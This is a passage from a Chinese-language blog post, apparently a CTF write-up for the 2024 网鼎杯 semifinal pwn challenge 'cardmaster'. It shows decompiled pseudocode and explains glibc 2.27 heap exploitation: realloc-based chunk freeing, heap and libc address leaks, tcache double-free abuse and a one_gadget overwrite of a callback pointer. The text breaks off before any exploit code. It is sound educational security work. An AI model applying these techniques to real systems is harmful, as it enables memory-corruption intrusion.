      
    </div><!-- .entry-content -->

    <footer class="entry-meta">
    <a href="/2025/12/07/%E8%B7%9F%E7%9D%8052pojie%E5%A4%A7%E4%BD%AC%E5%88%86%E6%9E%90%E4%B8%80%E4%BB%BD%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC/">
    <time datetime="2025-12-07T15:58:36.000Z" class="entry-date">
        2025-12-07
    </time>
</a>
    
  <span class="article-delim">&#8226;</span>
  <div class="article-category">
  <a class="article-category-link" href="/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88windows%EF%BC%89/">恶意代码分析（windows）</a>
  </div>

    
    </footer>
</article>






  
    <article id="post-2024网鼎杯半决赛-cardmaster" class="post-2024网鼎杯半决赛-cardmaster post type-post status-publish format-standard hentry">
    <!---->

      <header class="entry-header">
        
        
  
    <h1 class="entry-title">
      <a class="article-title" href="/2025/10/28/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-cardmaster/">2024网鼎杯半决赛 cardmaster</a>
    </h1>
  

        
        <div class="comments-link">
            
            <a href="javascript:void(0);" data-url="https://shanzade.github.io/2025/10/28/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-cardmaster/" data-id="cmjjqvfje0000ekvgdahjfis7" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
        </div><!-- .comments-link -->
      </header><!-- .entry-header -->

    <div class="entry-content">
      
        <h1 id="题目伪代码"><a href="#题目伪代码" class="headerlink" title="题目伪代码"></a>题目伪代码</h1><p>结构体定义</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_content</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 out_idx;<span class="comment">// 牌的花色和数字</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 in_idx;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">list_content</span> *<span class="title">content</span>[13];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cards</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> count;</span><br><span class="line">  <span class="type">int</span> range;</span><br><span class="line">  <span class="type">unsigned</span> __int64 *random_lvl_ptr;</span><br><span class="line">  <span class="type">unsigned</span> __int64 *ptr_record;</span><br><span class="line">  <span class="type">unsigned</span> __int64 *get_callback;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">list</span> *<span class="title">list_ptr</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>main</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> choice; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">cards</span> *<span class="title">structs</span>;</span> <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  srand(<span class="number">0xDEADBEEF</span>);</span><br><span class="line">  sub_B5C(<span class="number">3735928559LL</span>, a2);</span><br><span class="line">  sub_BBD();</span><br><span class="line">  structs = init_C0C();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      write(<span class="number">1</span>, &amp;buf_, <span class="number">3u</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">      <span class="keyword">if</span> ( choice != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      structs = init_C0C();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> ( choice )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        set_115A(structs);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        ((<span class="type">void</span> (__fastcall *)(<span class="keyword">struct</span> cards *))structs-&gt;get_callback)(structs);<span class="comment">// get</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        shuffle(structs);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        show_EF8(structs);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;invalid&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>init</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> cards *<span class="title function_">init_C0C</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">list_content</span> **<span class="title">v0</span>;</span> <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">cards</span> *<span class="title">cards</span>;</span> <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  cards = (<span class="keyword">struct</span> cards *)<span class="built_in">malloc</span>(<span class="number">0x28</span>u);</span><br><span class="line">  cards-&gt;list_ptr = (<span class="keyword">struct</span> <span class="built_in">list</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = &amp;cards-&gt;list_ptr-&gt;content[i];</span><br><span class="line">    *v0 = (<span class="keyword">struct</span> list_content *)<span class="built_in">malloc</span>(<span class="number">0xD0</span>u);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">12</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      cards-&gt;list_ptr-&gt;content[i][j].out_idx = i;</span><br><span class="line">      cards-&gt;list_ptr-&gt;content[i][j].in_idx = j + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  cards-&gt;count = <span class="number">4</span>;</span><br><span class="line">  cards-&gt;range = <span class="number">13</span>;</span><br><span class="line">  cards-&gt;ptr_record = (<span class="type">unsigned</span> __int64 *)&amp;unk_202010;</span><br><span class="line">  cards-&gt;get_callback = (<span class="type">unsigned</span> __int64 *)sub_D31;</span><br><span class="line">  cards-&gt;random_lvl_ptr = (<span class="type">unsigned</span> __int64 *)(qword_318 + <span class="number">208</span>);<span class="comment">// 0x3e8</span></span><br><span class="line">  <span class="keyword">return</span> cards;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>setinfo</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">set_115A</span><span class="params">(<span class="keyword">struct</span> cards *obj)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> **v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">ssize_t</span> count1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 *random_lvl_ptr; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;suit count:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, obj);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;digit range 1 - ?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;obj-&gt;range);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;randomize level:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%lld&quot;</span>, &amp;obj-&gt;random_lvl_ptr);</span><br><span class="line">  <span class="keyword">if</span> ( (_UNKNOWN *)obj-&gt;ptr_record == &amp;unk_202010 )</span><br><span class="line">    random_lvl_ptr = (<span class="type">unsigned</span> __int64 *)<span class="built_in">malloc</span>(<span class="number">4</span> * obj-&gt;count);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    random_lvl_ptr = (<span class="type">unsigned</span> __int64 *)<span class="built_in">realloc</span>(obj-&gt;ptr_record, <span class="number">4</span> * obj-&gt;count);</span><br><span class="line">  obj-&gt;list_ptr = (<span class="keyword">struct</span> <span class="built_in">list</span> *)<span class="built_in">realloc</span>(obj-&gt;list_ptr, <span class="number">8LL</span> * obj-&gt;count);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    count1 = (<span class="type">unsigned</span> <span class="type">int</span>)obj-&gt;count;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= (<span class="type">int</span>)count1 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    count1 = (<span class="type">unsigned</span> <span class="type">int</span>)obj-&gt;range;</span><br><span class="line">    <span class="keyword">if</span> ( !(_DWORD)count1 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v1 = (<span class="type">void</span> **)&amp;obj-&gt;list_ptr-&gt;content[i];</span><br><span class="line">    *v1 = <span class="built_in">malloc</span>(<span class="number">16LL</span> * obj-&gt;range);            <span class="comment">// 1</span></span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; obj-&gt;range; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      obj-&gt;list_ptr-&gt;content[i][j].out_idx = i;</span><br><span class="line">      obj-&gt;list_ptr-&gt;content[i][j].in_idx = j + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( random_lvl_ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    obj-&gt;ptr_record = random_lvl_ptr;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;new suite set:&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, obj-&gt;ptr_record, <span class="number">4</span> * obj-&gt;count);<span class="comment">// 2</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> count1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>getinfo</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_D31</span><span class="params">(<span class="keyword">struct</span> cards *cards)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;suit count is %d\n&quot;</span>, cards-&gt;count);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;digit range: 1 - %d\n&quot;</span>, cards-&gt;range);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;suit chara set:%s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)cards-&gt;ptr_record);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;randomize level:%lld\n&quot;</span>, cards-&gt;random_lvl_ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>shuffle</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 *__fastcall <span class="title function_">shuffle</span><span class="params">(<span class="keyword">struct</span> cards *structs)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">list_content</span> *<span class="title">ext1</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">list_content</span> *<span class="title">ext2</span>;</span> <span class="comment">// rdx</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">list_content</span> *<span class="title">ext1_1</span>;</span> <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 out_idx2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 in_idx2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">list_content</span> *<span class="title">v6</span>;</span> <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 *random_lvl_ptr; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">int</span> idx1; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> idx2; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> ran1; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> ran2; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 out_idx1; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 in_idx1; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    random_lvl_ptr = structs-&gt;random_lvl_ptr;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= (__int64)random_lvl_ptr )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    idx1 = rand() % structs-&gt;count;</span><br><span class="line">    idx2 = rand() % structs-&gt;count;</span><br><span class="line">    ran1 = rand() % structs-&gt;range;</span><br><span class="line">    ran2 = rand() % structs-&gt;range;</span><br><span class="line">    ext1 = &amp;structs-&gt;list_ptr-&gt;content[idx1][ran1];</span><br><span class="line">    out_idx1 = ext1-&gt;out_idx;</span><br><span class="line">    in_idx1 = ext1-&gt;in_idx;</span><br><span class="line">    ext2 = &amp;structs-&gt;list_ptr-&gt;content[idx2][ran2];</span><br><span class="line">    ext1_1 = ext1;</span><br><span class="line">    out_idx2 = ext2-&gt;out_idx;</span><br><span class="line">    in_idx2 = ext2-&gt;in_idx;</span><br><span class="line">    ext1_1-&gt;out_idx = out_idx2;</span><br><span class="line">    ext1_1-&gt;in_idx = in_idx2;</span><br><span class="line">    v6 = &amp;structs-&gt;list_ptr-&gt;content[idx2][ran2];</span><br><span class="line">    v6-&gt;out_idx = out_idx1;</span><br><span class="line">    v6-&gt;in_idx = in_idx1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> random_lvl_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>show</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">show_EF8</span><span class="params">(<span class="keyword">struct</span> cards *structs)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> count; <span class="comment">// [rsp+10h] [rbp-1B0h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+10h] [rbp-1B0h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+14h] [rbp-1ACh]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-1A8h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+18h] [rbp-1A8h]</span></span><br><span class="line">  <span class="type">int</span> n4; <span class="comment">// [rsp+1Ch] [rbp-1A4h]</span></span><br><span class="line">  _DWORD v8[<span class="number">102</span>]; <span class="comment">// [rsp+20h] [rbp-1A0h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+1B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  count = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( count &lt; structs-&gt;count )</span><br><span class="line">  &#123;</span><br><span class="line">    n4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">128</span>; ((<span class="type">unsigned</span> __int8)i &amp; *((_BYTE *)structs-&gt;ptr_record + v4)) != <span class="number">0</span>; i /= <span class="number">2</span> )</span><br><span class="line">      ++n4;</span><br><span class="line">    <span class="keyword">if</span> ( n4 &gt; <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;invalid suit table!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v8[count] = v4;</span><br><span class="line">    v8[count + <span class="number">52</span>] = n4;</span><br><span class="line">    v4 += n4;</span><br><span class="line">    count += n4 != <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; structs-&gt;count; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; structs-&gt;range; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      write(</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        (<span class="type">char</span> *)structs-&gt;ptr_record + (<span class="type">int</span>)v8[structs-&gt;list_ptr-&gt;content[j][k].out_idx],</span><br><span class="line">        (<span class="type">int</span>)v8[structs-&gt;list_ptr-&gt;content[j][k].out_idx + <span class="number">52</span>]);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot; %2lld &quot;</span>, structs-&gt;list_ptr-&gt;content[j][k].in_idx);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;s_);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>整个程序没有 <code>free</code>，但是有 <code>realloc</code>。<br>glibc 版本 2.27.<br>堆上存在一个指针调用函数的位置，考虑可以用来改写为 one_gadget。</p>
<h1 id="15mins-初步猜测"><a href="#15mins-初步猜测" class="headerlink" title="15mins 初步猜测"></a>15mins 初步猜测</h1><p>参考 <a target="_blank" rel="noopener" href="https://www.eqqie.cn/index.php/archives/1400/">REALLOC</a>，发现 <code>realloc</code> 有很多特性。<br>假如设置 <code>count</code> &#x3D; 0，释放 <code>random_lvl</code> 和 <code>list_ptr</code>，那么不会导致后面的 <code>setinfo</code> 赋值报错（<code>i &gt;= count</code> 会退出循环），但是无法读取和 <code>shuffle</code>。<br>猜测是利用 <code>init</code> 的恢复操作，配合 <code>realloc</code> 释放堆和重新申请堆来制造申请 bss 或重叠堆的条件。</p>
<h1 id="wp-复现"><a href="#wp-复现" class="headerlink" title="wp 复现"></a>wp 复现</h1><p>看了 wp 发现完全用不到 <code>shuffle</code> 这个函数，仅仅是迎合题目的名字来写的。（以后做题也要看看题目名字判断哪些函数是有用的，哪些函数是没用的。）</p>
<p>另外，2.27 的 3ubuntu1 似乎还没有添加对 tcache bins 的 double free 检测，但是 ubuntu 18 下的 2.27 3ubuntu1.6 是有检测的。这里是一个点。</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/15808">wp</a> 用了 doublefree 的特性来泄露堆地址。但也有可以不用 double free 泄露堆地址的方法。<br>注意到 <code>init</code> 函数中会申请 <code>0x30</code>（对齐后）的堆：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cards-&gt;list_ptr = (<span class="keyword">struct</span> <span class="built_in">list</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>u);</span><br></pre></td></tr></table></figure>
<p>而在 <code>setinfo</code> 中可以扩展或重新申请：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj-&gt;list_ptr = (<span class="keyword">struct</span> <span class="built_in">list</span> *)<span class="built_in">realloc</span>(obj-&gt;list_ptr, <span class="number">8LL</span> * obj-&gt;count);</span><br></pre></td></tr></table></figure>
<p>由于最开始运行程序时，<code>list</code> 申请到的堆的下方有其他堆存在，<code>realloc</code> 不可能扩展，所以原有的 <code>0x30</code> 会被释放。<br>所以，计算一个申请到 0x30 堆的数字，0x28 &#x2F; 4 &#x3D; 10，设置 count &#x3D; 10。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (_UNKNOWN *)obj-&gt;ptr_record == &amp;unk_202010 )</span><br><span class="line">  random_lvl_ptr = (<span class="type">unsigned</span> __int64 *)<span class="built_in">malloc</span>(<span class="number">4</span> * obj-&gt;count);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  random_lvl_ptr = (<span class="type">unsigned</span> __int64 *)<span class="built_in">realloc</span>(obj-&gt;ptr_record, <span class="number">4</span> * obj-&gt;count);</span><br></pre></td></tr></table></figure>
<p>此时 <code>randomlvlptr</code> 会申请到一个 0x30 的堆，而这时候 10 * 8 &#x3D; 80，原有的 <code>list</code> 堆 0x30 会被释放。<br>再设置 count 为 0 可以释放 <code>randomlvlptr</code> 的 0x30，从而在其 fd 位置写入指针，调用 <code>getinfo</code> 即可泄露。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;suit chara set:%s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)cards-&gt;ptr_record);</span><br></pre></td></tr></table></figure>

<p>同理，申请大堆块释放进入 unsorted bins 就可以泄露 libc 基址（这里即使 unsorted bin 与 top chunk 合并，仍然能泄露，<code>fd</code> <code>bk</code> 位置的信息在合并之后不会被删除）。</p>
<p>难就难在如何制造 double free。<br>最简单的方法就是直接利用 3ubuntu1 glibc 的 tcache 无检查 doublefree 特性产生 doublefree。（这里是看了 wp 才知道的点）<br><del>但是想不到 glibc 本身没有检查。印象中的 2.27 一直都是有 tcache double free 检测的。而且在 docker ubuntu18 上面测试也有检测，不知道是哪里问题了。</del></p>
<p>wp 直接利用 2.27 tcache 的特性，即不检查 tcachebins 的数量（这点在 docker ubuntu18 上成功验证了，该版本 glibc 似乎不会检查 tcache 计数）。<br>不检查计数，就会导致只要 <code>tcache_state</code> 中的对应 bins 位置有指针内容（地址非 0），<code>malloc</code> 就会尝试分配。<br>通过以下程序验证：</p>
